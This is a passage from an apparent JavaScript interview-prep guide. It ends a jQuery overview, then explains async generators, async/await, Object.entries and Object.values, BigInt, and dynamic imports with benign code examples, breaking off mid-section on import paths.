jQuery is a fast, lightweight JavaScript library designed to simplify HTML document traversal, manipulation, event handling, animation, and Ajax interactions. Created by John Resig in 2006, it revolutionized web development by providing cross-browser compatibility and a simpler syntax.

**Core Philosophy:**
"Write less, do more" - jQuery simplifies complex JavaScript operations into easy-to-use methods.

**Key Features:**

**1. DOM Manipulation**
Simplified selection and modification of HTML elements:

```javascript
// Vanilla JavaScript
document.getElementById('myDiv').style.display = 'none';
document.querySelectorAll('.items').forEach(el => {
  el.classList.add('active');
});

// jQuery - much simpler
$('#myDiv').hide();
$('.items').addClass('active');
```

**2. Event Handling**
Streamlined event binding and delegation:

```javascript
// Click event
$('button').click(function() {
  alert('Button clicked!');
});

// Event delegation (for dynamic elements)
$('#container').on('click', '.item', function() {
  $(this).toggleClass('selected');
});

// Multiple events
$('input').on('focus blur', function() {
  $(this).toggleClass('highlight');
});
```

**3. Ajax Operations**
Simplified asynchronous HTTP requests:

```javascript
// GET request
$.ajax({
  url: '/api/users',
  method: 'GET',
  success: function(data) {
    console.log(data);
  },
  error: function(error) {
    console.error('Request failed:', error);
  }
});

// Shorthand methods
$.get('/api/users', function(data) {
  $('#userList').html(data);
});

$.post('/api/users', { name: 'John', age: 30 }, function(response) {
  console.log('User created:', response);
});
```

**4. Animations and Effects**
Built-in animation methods:

```javascript
// Show/hide with animation
$('#element').fadeIn(500);
$('#element').slideDown('slow');
$('#element').fadeOut(300);

// Custom animations
$('#box').animate({
  width: '200px',
  height: '200px',
  opacity: 0.5
}, 1000);

// Chaining
$('#element')
  .slideUp(300)
  .delay(500)
  .fadeIn(400);
```

**5. Cross-Browser Compatibility**
jQuery abstracts browser differences (historically important for IE6-8):

```javascript
// jQuery handles browser inconsistencies automatically
$('.element').css('opacity', 0.5); // Works everywhere
$('.element').on('input', handler); // Normalized events
```

**6. Utility Functions**
Helpful methods for common tasks:

```javascript
// Array/Object iteration
$.each([1, 2, 3], function(index, value) {
  console.log(index + ': ' + value);
});

// Type checking
$.isArray([1, 2, 3]); // true
$.isFunction(myFunc); // true

// Extend objects
const obj1 = { a: 1 };
const obj2 = { b: 2 };
$.extend(obj1, obj2); // { a: 1, b: 2 }
```

**Common Applications:**

**1. Form Handling**
```javascript
$('#myForm').submit(function(e) {
  e.preventDefault();
  
  const formData = {
    username: $('#username').val(),
    email: $('#email').val()
  };
  
  $.post('/api/register', formData, function(response) {
    $('#message').text('Registration successful!');
  });
});
```

**2. Dynamic Content Loading**
```javascript
$('#loadMore').click(function() {
  $.get('/api/posts?page=2', function(data) {
    $('#postList').append(data);
  });
});
```

**3. Interactive UI Components**
```javascript
// Accordion
$('.accordion-header').click(function() {
  $(this).next('.accordion-content').slideToggle();
  $(this).toggleClass('active');
});

// Tabs
$('.tab').click(function() {
  const target = $(this).data('target');
  $('.tab').removeClass('active');
  $('.tab-content').hide();
  $(this).addClass('active');
  $(target).fadeIn();
});
```

**4. Image Galleries and Sliders**
```javascript
let currentSlide = 0;
$('.next').click(function() {
  currentSlide++;
  $('.slides').animate({
    left: -(currentSlide * 100) + '%'
  }, 500);
});
```

**jQuery Plugins Ecosystem:**
jQuery has thousands of plugins for extended functionality:
- **jQuery UI:** Draggable, droppable, sortable, datepicker
- **DataTables:** Advanced table features
- **Select2:** Enhanced select boxes
- **Slick:** Carousel/slider
- **Validation:** Form validation

**Modern Context:**

While jQuery was revolutionary and still used in many legacy projects, modern development has shifted away from it because:

**Reasons for Decline:**
- Modern browsers have better JavaScript APIs (ES6+)
- Native DOM methods are now easier (`querySelector`, `fetch`)
- Modern frameworks (React, Vue, Angular) handle DOM updates more efficiently
- Smaller bundle sizes with vanilla JavaScript
- Better performance with Virtual DOM approaches

**When jQuery is Still Useful:**
- Maintaining legacy codebases
- Quick prototypes or simple websites
- Projects requiring extensive browser backwards compatibility
- Working with WordPress or other CMS platforms (still use jQuery)
- Teams familiar with jQuery syntax

**Example Comparison:**

```javascript
// jQuery
$('.items').addClass('active').fadeIn(300);

// Modern Vanilla JavaScript
document.querySelectorAll('.items').forEach(el => {
  el.classList.add('active');
  el.style.transition = 'opacity 300ms';
  el.style.opacity = '1';
});

// Or with modern frameworks (React)
<div className={`items ${isActive ? 'active' : ''}`}>...</div>
```

**Conclusion:**
jQuery significantly shaped modern web development by making JavaScript accessible and consistent across browsers. While less common in new projects today, it remains an important part of web development history and is still maintained in millions of existing websites.




# JavaScript ES2017+ and Beyond (76-80)



## 76. What are async iterators and generators?

Async iterators and generators are JavaScript features that allow you to work with asynchronous data streams in a sequential, readable manner. They enable iteration over data that arrives asynchronously, such as API responses, file streams, or database queries.

**Async Iterators:**

An async iterator is an object that implements the async iteration protocol using `Symbol.asyncIterator` and returns promises.

```javascript
// Object with async iterator
const asyncIterable = {
  async *[Symbol.asyncIterator]() {
    yield 1;
    yield 2;
    yield 3;
  }
};

// Consuming with for-await-of
async function iterate() {
  for await (const value of asyncIterable) {
    console.log(value); // 1, 2, 3
  }
}
```

**Async Generators:**

Async generators are functions declared with `async function*` that can use both `await` and `yield` keywords.

**Basic Syntax:**

```javascript
async function* asyncGenerator() {
  yield 1;
  yield 2;
  yield 3;
}

// Usage
async function run() {
  for await (const value of asyncGenerator()) {
    console.log(value); // 1, 2, 3
  }
}
```

**Real-World Example - Fetching Paginated Data:**

```javascript
async function* fetchPages(url) {
  let page = 1;
  let hasMore = true;
  
  while (hasMore) {
    const response = await fetch(`${url}?page=${page}`);
    const data = await response.json();
    
    yield data.items;
    
    hasMore = data.hasNextPage;
    page++;
  }
}

// Usage
async function loadAllData() {
  for await (const items of fetchPages('/api/users')) {
    console.log('Loaded page:', items);
    // Process each page as it arrives
    displayUsers(items);
  }
}
```

**Example - Processing Large Files:**

```javascript
async function* readFileInChunks(file) {
  const chunkSize = 1024 * 1024; // 1MB chunks
  let offset = 0;
  
  while (offset < file.size) {
    const chunk = file.slice(offset, offset + chunkSize);
    const text = await chunk.text();
    yield text;
    offset += chunkSize;
  }
}

// Usage
async function processFile(file) {
  for await (const chunk of readFileInChunks(file)) {
    console.log('Processing chunk of size:', chunk.length);
    // Process each chunk without loading entire file
  }
}
```

**Example - Rate-Limited API Calls:**

```javascript
async function* fetchWithDelay(urls, delayMs = 1000) {
  for (const url of urls) {
    const response = await fetch(url);
    const data = await response.json();
    yield data;
    
    // Wait before next request
    await new Promise(resolve => setTimeout(resolve, delayMs));
  }
}

// Usage
async function getData() {
  const urls = ['/api/user/1', '/api/user/2', '/api/user/3'];
  
  for await (const userData of fetchWithDelay(urls)) {
    console.log('User:', userData);
  }
}
```

**Async Generator Methods:**

```javascript
async function* generator() {
  yield 1;
  yield 2;
  yield 3;
}

const gen = generator();

// next() returns a promise
await gen.next(); // { value: 1, done: false }
await gen.next(); // { value: 2, done: false }
await gen.next(); // { value: 3, done: false }
await gen.next(); // { value: undefined, done: true }
```

**Error Handling:**

```javascript
async function* errorGenerator() {
  yield 1;
  throw new Error('Something went wrong');
  yield 2; // Never reached
}

async function handleErrors() {
  try {
    for await (const value of errorGenerator()) {
      console.log(value);
    }
  } catch (error) {
    console.error('Caught error:', error.message);
  }
}
```

**Example - Real-Time Data Stream:**

```javascript
async function* stockPriceStream(symbol) {
  while (true) {
    const price = await fetchStockPrice(symbol);
    yield {
      symbol,
      price,
      timestamp: Date.now()
    };
    
    // Wait 5 seconds before next update
    await new Promise(resolve => setTimeout(resolve, 5000));
  }
}

// Usage
async function monitorStock() {
  for await (const update of stockPriceStream('AAPL')) {
    console.log(`${update.symbol}: $${update.price}`);
    
    // Can break out when condition is met
    if (update.price > 200) {
      console.log('Target price reached!');
      break;
    }
  }
}
```

**Benefits:**

- **Memory Efficient:** Process data incrementally without loading everything into memory
- **Readable Code:** Sequential syntax for asynchronous operations
- **Backpressure Handling:** Natural flow control for streaming data
- **Composability:** Can chain and combine async generators
- **Cancellation:** Easy to stop iteration with `break` or `return()`



## 77. What is the purpose of the `async` keyword?

The `async` keyword is used to declare asynchronous functions in JavaScript. It fundamentally changes how a function behaves and handles return values, making it easier to work with promises and asynchronous code.

**Core Purpose:**

The `async` keyword serves two main purposes:
1. Automatically wraps the return value in a Promise
2. Allows the use of `await` keyword inside the function

**Basic Syntax:**

```javascript
// Async function declaration
async function fetchData() {
  return 'Hello';
}

// Async arrow function
const fetchData = async () => {
  return 'Hello';
};

// Async method
const obj = {
  async getData() {
    return 'Hello';
  }
};
```

**How It Works:**

**1. Automatic Promise Wrapping**

Any value returned from an async function is automatically wrapped in a resolved Promise:

```javascript
async function getValue() {
  return 42;
}

// Equivalent to:
function getValue() {
  return Promise.resolve(42);
}

// Usage
getValue().then(value => console.log(value)); // 42

// Or with await
const value = await getValue(); // 42
```

**2. Enables `await` Keyword**

Inside an async function, you can use `await` to pause execution until a promise resolves:

```javascript
async function fetchUser() {
  // Pauses here until fetch completes
  const response = await fetch('/api/user');
  const data = await response.json();
  return data;
}

// Without async/await (Promise chaining)
function fetchUser() {
  return fetch('/api/user')
    .then(response => response.json())
    .then(data => data);
}
```

**Key Benefits:**

**1. Cleaner Error Handling**

```javascript
async function getData() {
  try {
    const response = await fetch('/api/data');
    const data = await response.json();
    return data;
  } catch (error) {
    console.error('Failed to fetch:', error);
    throw error;
  }
}

// Compare with Promise chains
function getData() {
  return fetch('/api/data')
    .then(response => response.json())
    .catch(error => {
      console.error('Failed to fetch:', error);
      throw error;
    });
}
```

**2. Sequential Asynchronous Operations**

```javascript
async function processUserData() {
  // Wait for each operation before proceeding
  const user = await fetchUser();
  const posts = await fetchUserPosts(user.id);
  const comments = await fetchPostComments(posts[0].id);
  
  return { user, posts, comments };
}
```

**3. Conditional Logic**

```javascript
async function authenticateUser(credentials) {
  const user = await login(credentials);
  
  if (user.requiresMFA) {
    const mfaCode = await promptForMFA();
    await verifyMFA(user.id, mfaCode);
  }
  
  return user;
}
```

**Parallel Execution:**

When operations don't depend on each other, run them in parallel:

```javascript
async function fetchMultipleData() {
  // Sequential (slow - 3 seconds total)
  const user = await fetchUser();      // 1 second
  const posts = await fetchPosts();    // 1 second
  const comments = await fetchComments(); // 1 second
  
  // Parallel (fast - 1 second total)
  const [user, posts, comments] = await Promise.all([
    fetchUser(),
    fetchPosts(),
    fetchComments()
  ]);
  
  return { user, posts, comments };
}
```

**Error Handling:**

**Try-Catch Block:**

```javascript
async function safeOperation() {
  try {
    const result = await riskyOperation();
    return result;
  } catch (error) {
    console.error('Operation failed:', error);
    return null;
  }
}
```

**Promise Rejection:**

```javascript
async function failingFunction() {
  throw new Error('Something went wrong');
  // Or: return Promise.reject(new Error('Something went wrong'));
}

// Catching the error
failingFunction().catch(error => {
  console.error('Caught:', error.message);
});
```

**Real-World Examples:**

**1. API Request with Loading State:**

```javascript
async function loadUserData(userId) {
  setLoading(true);
  
  try {
    const response = await fetch(`/api/users/${userId}`);
    
    if (!response.ok) {
      throw new Error(`HTTP error: ${response.status}`);
    }
    
    const user = await response.json();
    setUser(user);
    return user;
  } catch (error) {
    setError(error.message);
  } finally {
    setLoading(false);
  }
}
```

**2. Multiple Dependent Operations:**

```javascript
async function createOrder(items) {
  // Validate inventory
  const available = await checkInventory(items);
  
  if (!available) {
    throw new Error('Items not available');
  }
  
  // Create order
  const order = await saveOrder(items);
  
  // Process payment
  const payment = await processPayment(order.total);
  
  // Send confirmation
  await sendConfirmationEmail(order.id);
  
  return order;
}
```

**3. Retry Logic:**

```javascript
async function fetchWithRetry(url, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      const response = await fetch(url);
      return await response.json();
    } catch (error) {
      if (i === maxRetries - 1) throw error;
      console.log(`Retry ${i + 1}/${maxRetries}`);
      await new Promise(resolve => setTimeout(resolve, 1000));
    }
  }
}
```

**Important Considerations:**

**1. Always return or await:**
```javascript
// ❌ Bad - promise not handled
async function bad() {
  fetch('/api/data'); // Fire and forget
}

// ✅ Good
async function good() {
  await fetch('/api/data');
}
```

**2. Top-level await (modern JavaScript):**
```javascript
// In modules, you can use await at top level
const data = await fetch('/api/data');
console.log(data);
```

**3. Async functions always return promises:**
```javascript
async function getValue() {
  return 42;
}

console.log(getValue()); // Promise { <pending> }
getValue().then(v => console.log(v)); // 42
```



## 78. Can you explain the use of `Object.entries()` and `Object.values()`?

`Object.entries()` and `Object.values()` are ES2017 methods that provide convenient ways to extract data from objects. They complement `Object.keys()` to give you complete access to an object's enumerable properties.

**Object.values():**

Returns an array of an object's own enumerable property values.

**Syntax:**
```javascript
Object.values(obj)
```

**Basic Usage:**

```javascript
const person = {
  name: 'Alice',
  age: 30,
  city: 'New York'
};

const values = Object.values(person);
console.log(values); // ['Alice', 30, 'New York']
```

**Common Use Cases:**

**1. Summing Numeric Values:**
```javascript
const prices = {
  apple: 1.5,
  banana: 0.8,
  orange: 2.0
};

const total = Object.values(prices).reduce((sum, price) => sum + price, 0);
console.log(total); // 4.3
```

**2. Checking if Any Value Matches:**
```javascript
const formData = {
  username: 'john',
  email: '',
  password: 'secret123'
};

const hasEmptyField = Object.values(formData).some(value => value === '');
console.log(hasEmptyField); // true
```

**3. Iterating Over Values:**
```javascript
const scores = {
  math: 95,
  science: 87,
  english: 92
};

Object.values(scores).forEach(score => {
  console.log(`Score: ${score}`);
});
// Output: Score: 95, Score: 87, Score: 92
```

**Object.entries():**

Returns an array of an object's own enumerable property `[key, value]` pairs.

**Syntax:**
```javascript
Object.entries(obj)
```

**Basic Usage:**

```javascript
const person = {
  name: 'Alice',
  age: 30,
  city: 'New York'
};

const entries = Object.entries(person);
console.log(entries);
// [['name', 'Alice'], ['age', 30], ['city', 'New York']]
```

**Common Use Cases:**

**1. Converting Object to Map:**
```javascript
const obj = {
  id: 1,
  name: 'Product',
  price: 99.99
};

const map = new Map(Object.entries(obj));
console.log(map.get('name')); // 'Product'
```

**2. Filtering Object Properties:**
```javascript
const user = {
  id: 123,
  name: 'John',
  age: 25,
  email: 'john@example.com',
  password: 'secret'
};

// Remove sensitive data
const publicData = Object.entries(user)
  .filter(([key]) => key !== 'password')
  .reduce((obj, [key, value]) => {
    obj[key] = value;
    return obj;
  }, {});

console.log(publicData);
// { id: 123, name: 'John', age: 25, email: 'john@example.com' }
```

**3. Transforming Object Properties:**
```javascript
const prices = {
  apple: 1.5,
  banana: 0.8,
  orange: 2.0
};

// Apply 10% discount
const discounted = Object.entries(prices)
  .reduce((obj, [key, value]) => {
    obj[key] = value * 0.9;
    return obj;
  }, {});

console.log(discounted);
// { apple: 1.35, banana: 0.72, orange: 1.8 }
```

**4. Iterating with Destructuring:**
```javascript
const settings = {
  theme: 'dark',
  language: 'en',
  notifications: true
};

for (const [key, value] of Object.entries(settings)) {
  console.log(`${key}: ${value}`);
}
// Output:
// theme: dark
// language: en
// notifications: true
```

**5. Swapping Keys and Values:**
```javascript
const colorCodes = {
  red: '#FF0000',
  green: '#00FF00',
  blue: '#0000FF'
};

const codeToColor = Object.entries(colorCodes)
  .reduce((obj, [key, value]) => {
    obj[value] = key;
    return obj;
  }, {});

console.log(codeToColor);
// { '#FF0000': 'red', '#00FF00': 'green', '#0000FF': 'blue' }
```

**Comparison with Object.keys():**

```javascript
const data = {
  name: 'Alice',
  age: 30,
  city: 'NYC'
};

Object.keys(data);      // ['name', 'age', 'city']
Object.values(data);    // ['Alice', 30, 'NYC']
Object.entries(data);   // [['name', 'Alice'], ['age', 30], ['city', 'NYC']]
```

**Advanced Examples:**

**1. Nested Object Iteration:**
```javascript
const user = {
  personal: {
    name: 'John',
    age: 30
  },
  professional: {
    title: 'Developer',
    company: 'Tech Corp'
  }
};

Object.entries(user).forEach(([section, details]) => {
  console.log(`\n${section}:`);
  Object.entries(details).forEach(([key, value]) => {
    console.log(`  ${key}: ${value}`);
  });
});
```

**2. Object Validation:**
```javascript
const requiredFields = {
  username: 'string',
  email: 'string',
  age: 'number'
};

const userData = {
  username: 'john',
  email: 'john@example.com',
  age: 25
};

const isValid = Object.entries(requiredFields).every(([key, type]) => {
  return typeof userData[key] === type;
});

console.log(isValid); // true
```

**3. Creating Query Strings:**
```javascript
const params = {
  search: 'javascript',
  category: 'programming',
  page: 2
};

const queryString = Object.entries(params)
  .map(([key, value]) => `${key}=${encodeURIComponent(value)}`)
  .join('&');

console.log(queryString);
// 'search=javascript&category=programming&page=2'
```

**4. Merging and Deduplicating:**
```javascript
const obj1 = { a: 1, b: 2, c: 3 };
const obj2 = { b: 4, c: 5, d: 6 };

const merged = Object.entries({ ...obj1, ...obj2 })
  .reduce((acc, [key, value]) => {
    acc[key] = value;
    return acc;
  }, {});

console.log(merged); // { a: 1, b: 4, c: 5, d: 6 }
```

**5. Dynamic Property Access:**
```javascript
const translations = {
  en: 'Hello',
  es: 'Hola',
  fr: 'Bonjour'
};

const getGreeting = (lang) => {
  const entry = Object.entries(translations)
    .find(([key]) => key === lang);
  return entry ? entry[1] : translations.en;
};

console.log(getGreeting('es')); // 'Hola'
```

**Important Notes:**

**1. Only Enumerable Properties:**
```javascript
const obj = {};
Object.defineProperty(obj, 'hidden', {
  value: 'secret',
  enumerable: false
});
obj.visible = 'public';

console.log(Object.values(obj));  // ['public']
console.log(Object.entries(obj)); // [['visible', 'public']]
```

**2. Order of Properties:**
The order follows the same rules as `for...in` loops:
- Integer keys in ascending order
- String keys in insertion order
- Symbol keys are not included

```javascript
const obj = {
  '2': 'two',
  'b': 'letter b',
  '1': 'one',
  'a': 'letter a'
};

console.log(Object.keys(obj)); // ['1', '2', 'b', 'a']
```

**3. With Arrays:**
```javascript
const arr = ['a', 'b', 'c'];

Object.values(arr);  // ['a', 'b', 'c']
Object.entries(arr); // [['0', 'a'], ['1', 'b'], ['2', 'c']]
```

**Browser Support:**
Both methods are widely supported in modern browsers (ES2017+). For older environments, polyfills are available.



## 79. How does JavaScript handle big integers (`BigInt`)?

`BigInt` is a built-in JavaScript object (introduced in ES2020) that allows you to work with integers of arbitrary precision, going beyond the safe integer limit of the `Number` type.

**The Problem with Regular Numbers:**

JavaScript's `Number` type uses 64-bit floating-point format (IEEE 754), which can safely represent integers only up to `2^53 - 1`:

```javascript
// Maximum safe integer
console.log(Number.MAX_SAFE_INTEGER); // 9007199254740991

// Beyond this, precision is lost
console.log(9007199254740992 === 9007199254740993); // true (!)
console.log(9007199254740992 + 1); // 9007199254740992 (wrong!)
```

**Creating BigInt:**

There are two ways to create a BigInt:

**1. Using the `n` suffix:**
```javascript
const bigInt1 = 123n;
const bigInt2 = 9007199254740991n;
const bigInt3 = 1234567890123456789012345678901234567890n;
```

**2. Using the `BigInt()` constructor:**
```javascript
const bigInt1 = BigInt(123);
const bigInt2 = BigInt("9007199254740991");
const bigInt3 = BigInt("0x1fffffffffffff"); // From hex string
const bigInt4 = BigInt("0b111111"); // From binary string
```

**Basic Operations:**

BigInt supports all standard arithmetic operations:

```javascript
const a = 100n;
const b = 50n;

console.log(a + b);  // 150n
console.log(a - b);  // 50n
console.log(a * b);  // 5000n
console.log(a / b);  // 2n (division truncates decimals)
console.log(a % b);  // 0n
console.log(a ** b); // 10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000n
```

**Division Behavior:**

BigInt division always returns a BigInt, truncating any decimal part:

```javascript
console.log(7n / 2n);   // 3n (not 3.5)
console.log(10n / 3n);  // 3n (not 3.333...)
console.log(-7n / 2n);  // -3n (rounds towards zero)
```

**Comparisons:**

```javascript
const a = 10n;
const b = 5n;

console.log(a > b);   // true
console.log(a < b);   // false
console.log(a >= 10n); // true
console.log(a === 10n); // true

// BigInt and Number can be compared (loose equality)
console.log(10n == 10);  // true
console.log(10n === 10); // false (different types)
```

**Important Restrictions:**

**1. Cannot Mix BigInt with Number:**
```javascript
// ❌ This throws TypeError
const result = 10n + 5; // Error: Cannot mix BigInt and other types

// ✅ Must convert explicitly
const result1 = 10n + BigInt(5);     // 15n
const result2 = Number(10n) + 5;     // 15
```

**2. Cannot Use with Math Methods:**
```javascript
// ❌ This throws TypeError
Math.sqrt(4n); // Error: Cannot convert BigInt to number

// ✅ Convert to Number first (may lose precision)
Math.sqrt(Number(4n)); // 2
```

**3. Cannot Use Unary Plus:**
```javascript
// ❌ This throws TypeError
const x = +10n; // Error

// ✅ Use Number() instead
const x = Number(10n); // 10
```

**Type Checking:**

```javascript
console.log(typeof 123n); // "bigint"
console.log(typeof BigInt(123)); // "bigint"

console.log(123n instanceof BigInt); // false (primitives are not instances)
console.log(Object(123n) instanceof BigInt); // true (wrapped object)
```

**Conversion Between BigInt and Number:**

```javascript
// BigInt to Number
const bigNum = 123n;
const normalNum = Number(bigNum); // 123

// Number to BigInt
const num = 456;
const big = BigInt(num); // 456n

// Warning: Precision loss with large numbers
const hugeBigInt = 9007199254740992n;
const converted = Number(hugeBigInt);
console.log(converted); // 9007199254740992 (may lose precision)
```

**Real-World Use Cases:**

**1. Cryptography and Hashing:**
```javascript
// Working with large prime numbers
const largePrime = 982451653n;
const anotherPrime = 982451653n;
const product = largePrime * anotherPrime;
console.log(product); // 965331079193418409n
```

**2. Financial Calculations:**
```javascript
// Handling large monetary values in cents to avoid floating-point errors
const accountBalance = 1234567890123456789n; // cents
const deposit = 100000000n;
const newBalance = accountBalance + deposit;
console.log(newBalance); // 1234567890223456789n

// Convert to dollars for display
const dollars = Number(newBalance) / 100;
console.log(`$${dollars.toLocaleString()}`);
```

**3. Timestamps in Nanoseconds:**
```javascript
// JavaScript timestamps are in milliseconds
// For nanosecond precision:
const nanoseconds = BigInt(Date.now()) * 1000000n;
console.log(nanoseconds);
```

**4. Working with 64-bit IDs:**
```javascript
// Database IDs that exceed Number.MAX_SAFE_INTEGER
const userId = 9223372036854775807n; // 64-bit max
const postId = 9223372036854775806n;

const combinedId = (userId << 32n) | postId;
console.log(combinedId);
```

**Bitwise Operations:**

BigInt supports all bitwise operators:

```javascript
const a = 15n; // 1111 in binary
const b = 9n;  // 1001 in binary

console.log(a & b);  // 9n (AND: 1001)
console.log(a | b);  // 15n (OR: 1111)
console.log(a ^ b);  // 6n (XOR: 0110)
console.log(~a);     // -16n (NOT)
console.log(a << 2n); // 60n (left shift)
console.log(a >> 2n); // 3n (right shift)
```

**JSON Serialization:**

BigInt cannot be directly serialized to JSON:

```javascript
const data = { id: 123n };

// ❌ This throws TypeError
JSON.stringify(data); // Error: Do not know how to serialize a BigInt

// ✅ Custom serialization
JSON.stringify(data, (key, value) =>
  typeof value === 'bigint' ? value.toString() : value
);
// '{"id":"123"}'

// Or use a replacer
const bigIntReplacer = (key, value) =>
  typeof value === 'bigint' ? value.toString() + 'n' : value;
```

**Advanced Example - Factorial for Large Numbers:**

```javascript
function factorial(n) {
  if (n <= 1n) return 1n;
  let result = 1n;
  for (let i = 2n; i <= n; i++) {
    result *= i;
  }
  return result;
}

console.log(factorial(20n));
// 2432902008176640000n

console.log(factorial(100n));
// 93326215443944152681699238856266700490715968264381621468592963895217599993229915608941463976156518286253697920827223758251185210916864000000000000000000000000n
```

**Performance Considerations:**

```javascript
// BigInt operations are slower than Number operations
console.time('Number');
let numSum = 0;
for (let i = 0; i < 1000000; i++) {
  numSum += i;
}
console.timeEnd('Number'); // ~3ms

console.time('BigInt');
let bigSum = 0n;
for (let i = 0n; i < 1000000n; i++) {
  bigSum += i;
}
console.timeEnd('BigInt'); // ~50ms (significantly slower)
```

**Browser and Environment Support:**

```javascript
// Check if BigInt is supported
if (typeof BigInt !== 'undefined') {
  console.log('BigInt is supported');
  const big = 123n;
} else {
  console.log('BigInt is not supported');
  // Use polyfill or alternative approach
}
```

**Best Practices:**

1. **Use BigInt only when necessary** - for integers beyond `Number.MAX_SAFE_INTEGER`
2. **Be explicit with conversions** - don't mix BigInt and Number
3. **Consider performance** - BigInt operations are slower than Number
4. **Handle JSON carefully** - implement custom serialization
5. **Document BigInt usage** - make it clear when values are BigInt vs Number

**Summary:**

BigInt enables JavaScript to handle arbitrarily large integers with perfect precision, making it essential for:
- Cryptographic operations
- High-precision financial calculations
- Working with 64-bit database IDs
- Scientific computing with large numbers
- Blockchain and cryptocurrency applications



## 80. What are dynamic imports in JavaScript?

Dynamic imports are a feature that allows you to load JavaScript modules on-demand at runtime, rather than statically at the beginning of your script. This is done using the `import()` function, which returns a Promise.

**Static vs Dynamic Imports:**

**Static Import (ES6 Modules):**
```javascript
// Loaded at parse time, before code execution
import { myFunction } from './module.js';
import React from 'react';

myFunction();
```

**Dynamic Import:**
```javascript
// Loaded at runtime, when the code executes
import('./module.js')
  .then(module => {
    module.myFunction();
  })
  .catch(error => {
    console.error('Failed to load module:', error);
  });

// Or with async/await
async function loadModule() {
  const module = await import('./module.js');
  module.myFunction();
}
```

**Basic Syntax:**

```javascript
// Returns a Promise that resolves to the module object
import(modulePath)
  .then(module => {
    // Use module
  })
  .catch(error => {
    // Handle error
  });

// With async/await (preferred)
const module = await import(modulePath);
```

**Key Benefits:**

**1. Code Splitting:**
Load only the code you need, when you need it:

```javascript
// Load heavy feature only when user clicks
document.getElementById('advancedBtn').addEventListener('click', async () => {
  const { AdvancedFeature } = await import('./advanced-feature.js');
  const feature = new AdvancedFeature();
  feature.initialize();
});
```

**2. Conditional Loading:**
Load modules based on runtime conditions:

```javascript
async function loadLocale(language) {
  if (language === 'es') {
    const spanish = await import('./locales/es.js');
    return spanish.default;
  } else if (language === 'fr') {
    const french = await import('./locales/fr.js');
    return french.default;
  } else {
    const english = await import('./locales/en.js');
    return english.default;
  }
}

// Usage
const translations = await loadLocale(userLanguage);
```

**3. Performance Optimization:**
Reduce initial bundle size by lazy loading:

```javascript
// Initial load is fast - only core functionality
import { App } from './core.js';

// Heavy dependencies loaded later
async function loadChartLibrary() {
  // This is only loaded when needed
  const Chart = await import('chart.js');
  return Chart;
}
```

**Real-World Examples:**

**1. Route-Based Code Splitting (React Router):**
```javascript
import React, { lazy, Suspense } from 'react';
import { BrowserRouter, Routes, Route } from 'react-router-dom';

// Components loaded only when routes are accessed
const Home = lazy(() => import('./pages/Home'));
const About = lazy(() => import('./pages/About'));
const Dashboard = lazy(() => import('./pages/Dashboard'));

function App() {
  return (
    <BrowserRouter>
      <Suspense fallback={<div>Loading...</div>}>
        <Routes>
          <Route path="/" element={<Home />} />
          <Route path="/about" element={<About />} />
          <Route path="/dashboard" element={<Dashboard />} />
        </Routes>
      </Suspense>
    </BrowserRouter>
  );
}
```

**2. Feature Detection and Polyfills:**
```javascript
async function loadPolyfills() {
  if (!window.IntersectionObserver) {
    await import('intersection-observer');
  }
  
  if (!window.fetch) {
    await import('whatwg-fetch');
  }
}

// Load polyfills before initializing app
await loadPolyfills();
initializeApp();
```

**3. Loading Large Libraries on Demand:**
```javascript
// Load PDF library only when user wants to export
async function exportToPDF() {
  const loadingIndicator = showLoading();
  
  try {
    // jsPDF is large, only load when needed
    const { jsPDF } = await import('jspdf');
    const doc = new jsPDF();
    
    doc.text('Hello world!', 10, 10);
    doc.save('document.pdf');
  } catch (error) {
    console.error('Failed to load PDF library:', error);
  } finally {
    hideLoading(loadingIndicator);
  }
}
```

**4. Dynamic Theme Loading:**
```javascript
async function loadTheme(themeName) {
  try {
    // Load theme-specific styles and logic
    const theme = await import(`./themes/${themeName}.js`);
    theme.apply();
    
    // Load theme CSS dynamically
    const link = document.createElement('link');
    link.rel = 'stylesheet';
    link.href = `/themes/${themeName}.css`;
    document.head.appendChild(link);
  } catch (error) {
    console.error(`Failed to load theme: ${themeName}`, error);
    // Fallback to default theme
    await loadTheme('default');
  }
}

// Usage
await loadTheme(userPreferences.theme);
```

**5. Modal/Dialog Loading:**
```javascript
class ModalManager {
  async openModal(modalType) {
    try {
      // Load modal component only when opened
      const modalModule = await import(`./modals/${modalType}Modal.js`);
      const Modal = modalModule.default;
      
      const modal = new Modal();
      modal.render();
      modal.open();
    } catch (error) {
      console.error('Failed to load modal:', error);
    }
  }
}

// Usage
const manager = new ModalManager();
await manager.openModal('confirmation');
```

**6. A/B Testing:**
```javascript
async function loadExperimentVariant() {
  const variant = getUserVariant(); // 'A' or 'B'
  
  if (variant === 'B') {
    const experimentModule = await import('./experiments/variantB.js');
    experimentModule.initialize();
  } else {
    const controlModule = await import('./experiments/control.js');
    controlModule.initialize();
  }
}
```

**7. Loading Modules Based on Device:**
```javascript
async function loadDeviceSpecificModule() {
  const isMobile = window.innerWidth < 768;
  
  if (isMobile) {
    const mobileModule = await import('./mobile-ui.js');
    return mobileModule.default;
  } else {
    const desktopModule = await import('./desktop-ui.js');
    return desktopModule.default;
  }
}

const UI = await loadDeviceSpecificModule();
UI.initialize();
```

**Error Handling:**

```javascript
async function safeImport(modulePath) {
  try {
    const module = await import(modulePath);
    return module;
  } catch (error) {
    console.error(`Failed to load module: ${modulePath}`, error);
    
    // Retry logic
    if (error.name === 'NetworkError') {
      console.log('Retrying...');
      await new Promise(resolve => setTimeout(resolve, 1000));
      return safeImport(modulePath);
    }
    
    // Fallback module
    return import('./fallback-module.js');
  }
}
```

**Preloading Hints:**

You can hint to the browser to preload modules:

```javascript
// Add preload link for better performance
const link = document.createElement('link');
link.rel = 'modulepreload';
link.href = '/modules/heavy-module.js';
document.head.appendChild(link);

// Later, when needed
const module = await import('/modules/heavy-module.js');
```

**Named Exports:**

```javascript
// module.js
export const foo = 'foo';
export const bar = 'bar';
export default function() { }

// Importing
const module = await import('./module.js');
console.log(module.foo);        // 'foo'
console.log(module.bar);        // 'bar'
console.log(module.default);    // function

// Or with destructuring
const { foo, bar, default: defaultExport } = await import('./module.js');
```

**Module Path Requirements:**

```javascript
// ✅ Valid - string literals
await import('./module.js');
await import('/absolute/path/module.js');
await import('https://cdn.example.com/module.js');

// ✅ Valid - template literals with expressions
const lang = 'en';
await import(`./i18n/${lang}.js`);

// ✅ Valid - computed at runtime
const moduleName = getModuleName();
await import(`./modules/${moduleName}.js`);

